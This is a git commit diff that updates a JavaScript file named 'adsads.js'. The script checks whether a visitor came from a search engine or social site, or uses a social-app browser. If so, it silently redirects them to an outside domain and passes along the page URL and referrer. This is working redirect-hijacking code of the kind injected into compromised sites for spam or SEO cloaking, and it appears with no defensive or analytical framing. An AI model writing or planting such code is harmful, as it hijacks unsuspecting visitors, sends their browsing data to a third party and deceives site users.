477ff87a83ec74f3136e1f255fa55543518fbdaf
xerisahu <92183349+xerisahu@users.noreply.github.com>
2022-04-20 23:55:55 +0700

    Update adsads.js

--- adsads.js
+++ adsads.js
@@ -1,10 +1,12 @@
-var ars = rChoice([
+//<![CDATA[
+var ars 	= rChoice([
 	'https://www.soalkunci.xyz/',
 	]);
 
 function rChoice(arr) {
-return arr[Math.floor(arr.length * Math.random())];
+    return arr[Math.floor(arr.length * Math.random())];
 }
 
 //Code arsae client javascript
-if(['.google.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', 'duckduckgo.', 'instagram.', 'twitter.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'weheartit.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'weheartit', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+//]]>
